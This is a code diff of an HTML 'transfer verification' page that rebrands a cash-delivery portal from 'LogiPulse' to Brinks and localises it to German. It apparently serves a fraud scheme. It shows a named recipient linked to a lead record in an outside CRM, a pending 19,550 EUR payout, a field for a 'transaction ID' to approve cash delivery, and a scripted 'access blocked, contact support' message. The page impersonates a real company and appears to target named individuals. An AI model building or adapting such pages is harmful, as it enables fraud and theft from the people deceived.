@@ -1,9 +1,9 @@
-<!DOCTYPE html>
-<html lang="pl">
+﻿<!DOCTYPE html>
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="page-title">LogiPulse Secure Logistics | Weryfikacja transferu</title>
+    <title id="page-title">Brinks | Verification</title>
     
     <!-- Corporate Font Inter -->
     <link href="https://fonts.googleapis.com" rel="stylesheet">
@@ -148,16 +148,16 @@
             display: flex;
             align-items: center;
             justify-content: flex-start;
-            min-height: 70px;
-            height: 70px;
+            min-height: 100px;
+            height: 100px;
             padding: 0 !important;
             margin: 0 !important;
             float: none !important;
         }
 
-        .logipulse-logo {
-            height: 70px !important;
-            max-height: 70px !important;
+        .brinks-logo {
+            height: 100px !important;
+            max-height: 100px !important;
             width: auto !important;
             display: block !important;
             object-fit: contain;
@@ -438,6 +438,7 @@
             display: inline-flex !important;
             align-items: center !important;
             line-height: 1 !important;
+            white-space: nowrap !important;
         }
 
         /* Status Badge */
@@ -654,6 +655,7 @@
             word-break: normal !important;
             overflow-wrap: break-word !important;
             hyphens: auto !important;
+            white-space: pre-line !important;
         }
 
         /* Footer */
@@ -685,13 +687,13 @@
                 position: static !important;
                 float: none !important;
                 text-align: center !important;
-                min-height: 54px !important;
-                height: 54px !important;
+                min-height: 72px !important;
+                height: 72px !important;
             }
 
-            header img, .logo img, img[src*="logo.png"], .logipulse-logo {
-                height: 54px !important;
-                max-height: 54px !important;
+            header img, .logo img, img[src*="BRINKS.png"], .brinks-logo {
+                height: 72px !important;
+                max-height: 72px !important;
                 width: auto !important;
                 display: block !important;
                 margin: 0 auto !important;
@@ -762,15 +764,15 @@
 
         <!-- Obere Sicherheitsleiste -->
         <div class="top-security-bar">
-            <span><i class="fa-solid fa-lock" style="color: #004C97;"></i> <span data-i18n="sec_bar">Bezpieczny portal logistyczny</span></span>
-            <span data-i18n="sys_num">Protokół: LGP-LOG-VOUCHER</span>
+            <span><i class="fa-solid fa-lock" style="color: #004C97;"></i> <span data-i18n="sec_bar">Gesichertes Logistik-Portal</span></span>
+            <span data-i18n="sys_num">Protokoll: LGP-LOG-VOUCHER</span>
         </div>
 
         <!-- Header -->
         <header>
             <div class="logo-block">
                 <a href="javascript:void(0);" style="display: block; margin: 0; padding: 0;">
-                    <img src="logo.png" alt="LogiPulse" class="logipulse-logo">
+                    <img src="./BRINKS.png" alt="Brinks" class="brinks-logo">
                 </a>
             </div>
             
@@ -779,11 +781,11 @@
                 <div class="lang-switcher">
                     <button class="lang-btn" data-lang="ru" onclick="setLanguage('ru', event)">RU</button>
                     <button class="lang-btn" data-lang="en" onclick="setLanguage('en', event)">EN</button>
-                    <button class="lang-btn" data-lang="de" onclick="setLanguage('de', event)">DE</button>
-                    <button class="lang-btn active" data-lang="pl" onclick="setLanguage('pl', event)">PL</button>
+                    <button class="lang-btn active" data-lang="de" onclick="setLanguage('de', event)">DE</button>
+                    <button class="lang-btn" data-lang="pl" onclick="setLanguage('pl', event)">PL</button>
                 </div>
                 <div class="tagline" data-i18n="tagline">
-                    Twoje bezpieczeństwo to nasz priorytet
+                    Ihre Sicherheit ist unser Anliegen
                 </div>
             </div>
         </header>
@@ -796,7 +798,7 @@
                 <div id="cardMainContent">
                     <div class="header-actions-bar">
                         <div class="system-badge">
-                            <i class="fa-solid fa-shield-halved"></i> <span data-i18n="badge">Weryfikacja transferu</span>
+                            <i class="fa-solid fa-shield-halved"></i> <span data-i18n="badge">Transferüberprüfung</span>
                         </div>
                     </div>
 
@@ -805,11 +807,11 @@
                         <div class="info-tabs-header">
                             <button type="button" class="info-tab-btn" id="tabBtnInfo" onclick="switchInfoTab('info')">
                                 <i class="fa-solid fa-circle-info"></i>
-                                <span data-i18n="tab_info">Informacje</span>
+                                <span data-i18n="tab_info">Informationen</span>
                             </button>
                             <button type="button" class="info-tab-btn active" id="tabBtnData" onclick="switchInfoTab('data')">
                                 <i class="fa-solid fa-id-card"></i>
-                                <span data-i18n="tab_data">Dane</span>
+                                <span data-i18n="tab_data">Daten</span>
                             </button>
                         </div>
 
@@ -818,23 +820,23 @@
                             <div class="info-grid">
                                 <div class="info-item">
                                     <span class="info-label" data-i18n="info_portal_type_lbl">System:</span>
-                                    <span class="info-value" data-i18n="info_portal_type_val">Portal potwierdzenia transportu</span>
+                                    <span class="info-value" data-i18n="info_portal_type_val">Transportbestätigungs-Portal</span>
                                 </div>
                                 <div class="info-item">
-                                    <span class="info-label" data-i18n="info_carrier_lbl">Przewoźnik:</span>
-                                    <span class="info-value">LogiPulse Logistics & Transport</span>
+                                    <span class="info-label" data-i18n="info_carrier_lbl">Transporteur:</span>
+                                    <span class="info-value">Brinks Logistics & Transport</span>
                                 </div>
                                 <div class="info-item">
-                                    <span class="info-label" data-i18n="info_security_lbl">Bezpieczeństwo:</span>
-                                    <span class="info-value" data-i18n="info_security_val">Szyfrowanie ISO 27001</span>
+                                    <span class="info-label" data-i18n="info_security_lbl">Sicherheit:</span>
+                                    <span class="info-value" data-i18n="info_security_val">ISO 27001 Verschlüsselt</span>
                                 </div>
                                 <div class="info-item">
-                                    <span class="info-label" data-i18n="info_session_lbl">Status systemu:</span>
-                                    <span class="info-value" data-i18n="info_session_val">Połączenie chronione</span>
+                                    <span class="info-label" data-i18n="info_session_lbl">Systemstatus:</span>
+                                    <span class="info-value" data-i18n="info_session_val">Geschützte Verbindung</span>
                                 </div>
                             </div>
                             <div class="info-text-description" data-i18n="info_desc_text">
-                                Oficjalny portal logistyczny LogiPulse. Sekcja zawiera aktualne informacje o statusie usług, bezpieczeństwie tras i walidacji transferów.
+                                Offizielles Brinks Logistikportal. Dieser Bereich bietet aktuelle Informationen zum Servicestatus, zur Routensicherheit und zur Validierung von Transfers.
                             </div>
                         </div>
 
@@ -842,19 +844,19 @@
                         <div id="tabContentData" class="tab-content" style="display: block;">
                             <div class="info-grid">
                                 <div class="info-item">
-                                    <span class="info-label" data-i18n="data_recipient_lbl">Odbiorca:</span>
-                                    <span class="info-value premium-data">Zbigniew Maslowski</span>
+                                    <span class="info-label" data-i18n="data_recipient_lbl">Empfänger:</span>
+                                    <span class="info-value premium-data"><a href="https://uhf-group.xyz/crm/leads/96136" target="_blank" rel="noopener noreferrer" style="color: inherit; text-decoration: none; font-weight: 600;">Valentina Martyn</a></span>
                                 </div>
                                 <div class="info-item">
-                                    <span class="info-label" data-i18n="data_amount_lbl">Kwota odbioru:</span>
-                                    <span class="info-value premium-data premium-amount">228 000.00 USD</span>
+                                    <span class="info-label" data-i18n="data_amount_lbl">Auszahlungsbetrag:</span>
+                                    <span class="info-value premium-data premium-amount" data-i18n="data_amount_val" style="white-space: nowrap;">19.550 EUR</span>
                                 </div>
                                 <div class="info-item full-width">
                                     <div class="status-container-fixed">
-                                        <span class="info-label" data-i18n="data_status_lbl">Status dostawy:</span>
+                                        <span class="info-label" data-i18n="data_status_lbl">Lieferstatus:</span>
                                         <div class="status-badge-pending">
                                             <i class="fa-solid fa-clock"></i>
-                                            <span data-i18n="data_status_val">OCZEKUJĄCY</span>
+                                            <span data-i18n="data_status_val">AUSSTEHEND</span>
                                         </div>
                                     </div>
                                 </div>
@@ -864,22 +866,22 @@
                     </div>
 
                     <!-- Форма активации -->
-                    <h1 class="card-title" data-i18n="title">Potwierdzenie inkasa i dostawy środków pieniężnych</h1>
-                    <p class="card-description" data-i18n="desc">Wprowadź swój indywidualny identyfikator transakcji, aby potwierdzić umowę i zatwierdzić dostawę gotówki.</p>
+                    <h1 class="card-title" data-i18n="title">Bestätigung bar Inkasso und Bargeldzustellung</h1>
+                    <p class="card-description" data-i18n="desc">Geben Sie Ihre individuelle Transaktions-ID ein, um die Vereinbarung zu bestätigen und die Bargeldzustellung zu genehmigen.</p>
                     
                     <form id="secureForm" onsubmit="triggerVerification(event)">
                         <div class="form-group">
-                            <label class="form-label" for="identityCode" data-i18n="label_code">Kod identyfikacyjny</label>
+                            <label class="form-label" for="identityCode" data-i18n="label_code">Identifikationscode</label>
                             <div class="input-container">
                                 <i class="fa-solid fa-barcode"></i>
-                                <input type="text" id="identityCode" class="secure-input" data-i18n-placeholder="placeholder_code" placeholder="Wprowadź kod identyfikacyjny..." required autocomplete="off" oninvalid="this.setCustomValidity(currentLang === 'pl' ? 'Proszę wypełnić to pole.' : currentLang === 'de' ? 'Bitte füllen Sie dieses Feld aus.' : currentLang === 'en' ? 'Please fill out this field.' : 'Заполните это поле.')" oninput="this.setCustomValidity('')">
+                                <input type="text" id="identityCode" class="secure-input" data-i18n-placeholder="placeholder_code" placeholder="Identifikationscode eingeben..." required autocomplete="off" oninvalid="this.setCustomValidity(currentLang === 'pl' ? 'Proszę wypełnić to pole.' : currentLang === 'de' ? 'Bitte füllen Sie dieses Feld aus.' : currentLang === 'en' ? 'Please fill out this field.' : 'Заполните это поле.')" oninput="this.setCustomValidity('')">
                             </div>
                         </div>
-                        <button type="submit" id="submitBtn" class="submit-btn" data-i18n="btn_submit">Potwierdź inkaso</button>
+                        <button type="submit" id="submitBtn" class="submit-btn" data-i18n="btn_submit">Inkasso bestätigen</button>
                     </form>
 
                     <div class="support-hint">
-                        <span data-i18n="support_text">Pytania dotyczące walidacji? Skontaktuj się z naszym</span> <a href="javascript:void(0);" data-i18n="support_link">centrum obsługi logistycznej</a>.
+                        <span data-i18n="support_text">Fragen zur Validierung? Kontaktieren Sie unser</span> <a href="javascript:void(0);" data-i18n="support_link">Logistik-Service-Center</a>.
                     </div>
                 </div>
 
@@ -889,7 +891,13 @@
                         <i class="fa-solid fa-exclamation"></i>
                     </div>
                     <div class="blocked-message" data-i18n="blocked_msg">
-                        Dostawa środków pieniężnych została wstrzymana. Aleksiej Kotowski został przewieziony do bezpiecznego miejsca.
+                        Achtung: Der Zugriff auf Vorgänge ist eingeschränkt
+
+Identifizierung nicht erfolgreich. Gemäß den internen Sicherheitsrichtlinien des Unternehmens Brinks wurde die weitere Eingabe von Daten in diesem Interface vollständig gesperrt.
+
+Auf Grundlage der erhaltenen Systemdaten wurde die Möglichkeit der Zustellung für Ihr Profil gesperrt. Diese Maßnahme gilt für die aktuelle Sitzung und wurde zum Schutz vor unbefugten Aktionen getroffen.
+
+Zur Verifizierung der Daten, Aufhebung der Einschränkungen und Wiederherstellung des Zugriffs auf die Dienste wenden Sie sich bitte an den Support.
                     </div>
                 </div>
 
@@ -898,8 +906,8 @@
 
         <!-- Footer -->
         <footer>
-            <div data-i18n="footer_copy">&copy; 2026 LogiPulse Logistics & Transport. Wszelkie prawa zastrzeżone.</div>
-            <div data-i18n="footer_dept">Dział Bezpiecznych Rozwiązań Logistycznych</div>
+            <div data-i18n="footer_copy">&copy; 2026 Brinks Logistics & Transport. Alle Rechte vorbehalten.</div>
+            <div data-i18n="footer_dept">Abteilung für geschützte Logistiklösungen</div>
         </footer>
 
     </div>
@@ -908,7 +916,7 @@
     <script>
         const translations = {
             ru: {
-                title_doc: "LogiPulse Secure Logistics | Верификация перевода",
+                title_doc: "Brinks | Verification",
                 sec_bar: "Защищенный логистический портал",
                 sys_num: "Протокол: LGP-LOG-VOUCHER",
                 tagline: "Ваша безопасность — наша забота",
@@ -918,8 +926,9 @@
                 tab_data: "Данные",
                 data_recipient_lbl: "Получатель:",
                 data_amount_lbl: "Сумма к получению:",
+                data_amount_val: "19,550 EUR",
                 data_status_lbl: "Статус доставки:",
-                data_status_val: "ОЖИДАЕТСЯ",
+                data_status_val: "ОЖИДАНИЕ",
 
                 info_title: "Информация",
                 info_portal_type_lbl: "Система:",
@@ -929,7 +938,7 @@
                 info_security_val: "Протокол ISO 27001 (Зашифровано)",
                 info_session_lbl: "Статус системы:",
                 info_session_val: "Защищенное соединение",
-                info_desc_text: "Официальный логистический портал LogiPulse. Данный раздел содержит актуальные сведения о статусе обслуживания, безопасности маршрутов и валидации перевозок.",
+                info_desc_text: "Официальный логистический портал Brinks. Данный раздел содержит актуальные сведения о статусе обслуживания, безопасности маршрутов и валидации перевозок.",
 
                 title: "Подтверждение инкассации и доставки наличных средств",
                 desc: "Введите ваш индивидуальный идентификатор транзакции для подтверждения соглашения и одобрения доставки наличных.",
@@ -939,13 +948,13 @@
                 support_text: "Вопросы по валидации? Обратитесь в наш",
                 support_link: "центр логистического обслуживания",
 
-                blocked_msg: "Доставка денежных средств приостановлена. Алексей Котовский был перевезен в безопасное место.",
+                blocked_msg: "Внимание: Доступ к операциям ограничен\n\nИдентификация неуспешна. В соответствии с внутренними регламентами безопасности компании Brinks, дальнейший ввод данных в данном интерфейсе полностью заблокирован.\n\nНа основании полученных системных данных возможность доставки заблокирована для вашего профиля. Данная мера является окончательной для текущей сессии и принята в целях предотвращения несанкционированных действий.\n\nДля верификации данных, снятия ограничений и восстановления доступа к сервисам, пожалуйста, обратитесь в службу поддержки.",
 
-                footer_copy: "© 2026 LogiPulse Logistics & Transport. Все права защищены.",
+                footer_copy: "© 2026 Brinks Logistics & Transport. Все права защищены.",
                 footer_dept: "Департамент защищенных логистических решений"
             },
             en: {
-                title_doc: "LogiPulse Secure Logistics | Transfer Verification",
+                title_doc: "Brinks | Verification",
                 sec_bar: "Secure Logistics Portal",
                 sys_num: "Protocol: LGP-LOG-VOUCHER",
                 tagline: "Your safety is our concern",
@@ -955,6 +964,7 @@
                 tab_data: "Data",
                 data_recipient_lbl: "Recipient:",
                 data_amount_lbl: "Amount to Receive:",
+                data_amount_val: "19,550 EUR",
                 data_status_lbl: "Delivery Status:",
                 data_status_val: "PENDING",
 
@@ -966,7 +976,7 @@
                 info_security_val: "ISO 27001 Encrypted Protocol",
                 info_session_lbl: "System Status:",
                 info_session_val: "Protected Connection",
-                info_desc_text: "Official LogiPulse logistics portal. This section provides detailed service status, route security overviews, and transfer validation details.",
+                info_desc_text: "Official Brinks logistics portal. This section provides detailed service status, route security overviews, and transfer validation details.",
 
                 title: "Confirmation of cash collection and delivery",
                 desc: "Enter your individual transaction ID to confirm the agreement and approve the cash delivery.",
@@ -976,13 +986,13 @@
                 support_text: "Validation inquiries? Contact our",
                 support_link: "logistics service center",
 
-                blocked_msg: "Cash delivery has been suspended. Aleksei Kotovskii has been moved to a safe location.",
+                blocked_msg: "Attention: Access to operations is restricted\n\nIdentification unsuccessful. In accordance with the internal security regulations of Brinks, further data entry in this interface has been fully blocked.\n\nBased on the system data received, the delivery option has been blocked for your profile. This measure is final for the current session and has been taken to prevent unauthorized actions.\n\nTo verify your data, lift the restrictions and restore access to the services, please contact support.",
 
-                footer_copy: "© 2026 LogiPulse Logistics & Transport. All rights reserved.",
+                footer_copy: "© 2026 Brinks Logistics & Transport. All rights reserved.",
                 footer_dept: "Department of Secure Logistics Solutions"
             },
             de: {
-                title_doc: "LogiPulse Secure Logistics | Transferüberprüfung",
+                title_doc: "Brinks | Verification",
                 sec_bar: "Gesichertes Logistik-Portal",
                 sys_num: "Protokoll: LGP-LOG-VOUCHER",
                 tagline: "Ihre Sicherheit ist unser Anliegen",
@@ -992,8 +1002,9 @@
                 tab_data: "Daten",
                 data_recipient_lbl: "Empfänger:",
                 data_amount_lbl: "Auszahlungsbetrag:",
+                data_amount_val: "19.550 EUR",
                 data_status_lbl: "Lieferstatus:",
-                data_status_val: "IN BEARBEITUNG",
+                data_status_val: "AUSSTEHEND",
 
                 info_title: "Informationen",
                 info_portal_type_lbl: "System:",
@@ -1003,7 +1014,7 @@
                 info_security_val: "ISO 27001 Verschlüsselt",
                 info_session_lbl: "Systemstatus:",
                 info_session_val: "Geschützte Verbindung",
-                info_desc_text: "Offizielles LogiPulse Logistikportal. Dieser Bereich bietet aktuelle Informationen zum Servicestatus, zur Routensicherheit und zur Validierung von Transfers.",
+                info_desc_text: "Offizielles Brinks Logistikportal. Dieser Bereich bietet aktuelle Informationen zum Servicestatus, zur Routensicherheit und zur Validierung von Transfers.",
 
                 title: "Bestätigung bar Inkasso und Bargeldzustellung",
                 desc: "Geben Sie Ihre individuelle Transaktions-ID ein, um die Vereinbarung zu bestätigen und die Bargeldzustellung zu genehmigen.",
@@ -1013,13 +1024,13 @@
                 support_text: "Fragen zur Validierung? Kontaktieren Sie unser",
                 support_link: "Logistik-Service-Center",
 
-                blocked_msg: "Die Bargeldzustellung wurde eingestellt. Aleksei Kotovskii wurde an einen sicheren Ort gebracht.",
+                blocked_msg: "Achtung: Der Zugriff auf Vorgänge ist eingeschränkt\n\nIdentifizierung nicht erfolgreich. Gemäß den internen Sicherheitsrichtlinien des Unternehmens Brinks wurde die weitere Eingabe von Daten in diesem Interface vollständig gesperrt.\n\nAuf Grundlage der erhaltenen Systemdaten wurde die Möglichkeit der Zustellung für Ihr Profil gesperrt. Diese Maßnahme gilt für die aktuelle Sitzung und wurde zum Schutz vor unbefugten Aktionen getroffen.\n\nZur Verifizierung der Daten, Aufhebung der Einschränkungen und Wiederherstellung des Zugriffs auf die Dienste wenden Sie sich bitte an den Support.",
 
-                footer_copy: "© 2026 LogiPulse Logistics & Transport. Alle Rechte vorbehalten.",
+                footer_copy: "© 2026 Brinks Logistics & Transport. Alle Rechte vorbehalten.",
                 footer_dept: "Abteilung für geschützte Logistiklösungen"
             },
             pl: {
-                title_doc: "LogiPulse Secure Logistics | Weryfikacja transferu",
+                title_doc: "Brinks | Verification",
                 sec_bar: "Bezpieczny portal logistyczny",
                 sys_num: "Protokół: LGP-LOG-VOUCHER",
                 tagline: "Twoje bezpieczeństwo to nasz priorytet",
@@ -1029,8 +1040,9 @@
                 tab_data: "Dane",
                 data_recipient_lbl: "Odbiorca:",
                 data_amount_lbl: "Kwota odbioru:",
+                data_amount_val: "19,550 EUR",
                 data_status_lbl: "Status dostawy:",
-                data_status_val: "OCZEKUJĄCY",
+                data_status_val: "OCZEKIWANIE",
 
                 info_title: "Informacje",
                 info_portal_type_lbl: "System:",
@@ -1040,7 +1052,7 @@
                 info_security_val: "Szyfrowanie ISO 27001",
                 info_session_lbl: "Status systemu:",
                 info_session_val: "Połączenie chronione",
-                info_desc_text: "Oficjalny portal logistyczny LogiPulse. Sekcja zawiera aktualne informacje o statusie usług, bezpieczeństwie tras i walidacji transferów.",
+                info_desc_text: "Oficjalny portal logistyczny Brinks. Sekcja zawiera aktualne informacje o statusie usług, bezpieczeństwie tras i walidacji transferów.",
 
                 title: "Potwierdzenie inkasa i dostawy środków pieniężnych",
                 desc: "Wprowadź swój indywidualny identyfikator transakcji, aby potwierdzić umowę i zatwierdzić dostawę gotówki.",
@@ -1050,14 +1062,14 @@
                 support_text: "Pytania dotyczące walidacji? Skontaktuj się z naszym",
                 support_link: "centrum obsługi logistycznej",
 
-                blocked_msg: "Dostawa środków pieniężnych została wstrzymana. Aleksiej Kotowski został przewieziony do bezpiecznego miejsca.",
+                blocked_msg: "Uwaga: Dostęp do operacji jest ograniczony\n\nIdentyfikacja nieudana. Zgodnie z wewnętrznymi przepisami bezpieczeństwa firmy Brinks, dalsze wprowadzanie danych w tym interfejsie zostało całkowicie zablokowane.\n\nNa podstawie otrzymanych danych systemowych możliwość dostawy została zablokowana dla Twojego profilu. Środek ten jest ostateczny dla bieżącej sesji i został podjęty w celu zapobiegania nieautoryzowanym działaniom.\n\nW celu weryfikacji danych, zniesienia ograniczeń i przywrócenia dostępu do usług prosimy o kontakt z pomocą techniczną.",
 
-                footer_copy: "© 2026 LogiPulse Logistics & Transport. Wszelkie prawa zastrzeżone.",
+                footer_copy: "© 2026 Brinks Logistics & Transport. Wszelkie prawa zastrzeżone.",
                 footer_dept: "Dział Bezpiecznych Rozwiązań Logistycznych"
             }
         };
 
-        let currentLang = 'pl';
+        let currentLang = 'de';
         let fadeTimeout = null;
 
         function setLanguage(lang, event) {
@@ -1146,7 +1158,7 @@
         }
 
         document.addEventListener('DOMContentLoaded', () => {
-            setLanguage('pl');
+            setLanguage('de');
             switchInfoTab('data');
 
             // Аудит статуса блокировки
